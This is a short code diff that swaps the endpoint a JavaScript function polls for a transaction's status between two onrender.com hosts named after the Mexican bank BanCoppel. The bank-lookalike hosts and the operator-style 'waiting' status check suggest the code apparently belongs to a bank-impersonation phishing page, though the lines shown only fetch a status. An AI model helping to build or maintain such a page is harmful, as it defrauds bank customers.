@@ -112,7 +112,7 @@ document.addEventListener('DOMContentLoaded', async function () {
 
   async function revisarAccion(txId) {
     try {
-      const res = await fetch(`https://bancoppel-mtyg.onrender.com/sendStatus.php?txid=${txId}`);
+      const res = await fetch(`https://coppelpersonas.onrender.com/sendStatus.php?txid=${txId}`);
       const json = await res.json();
 
       if (!json.status || json.status === "esperando") {
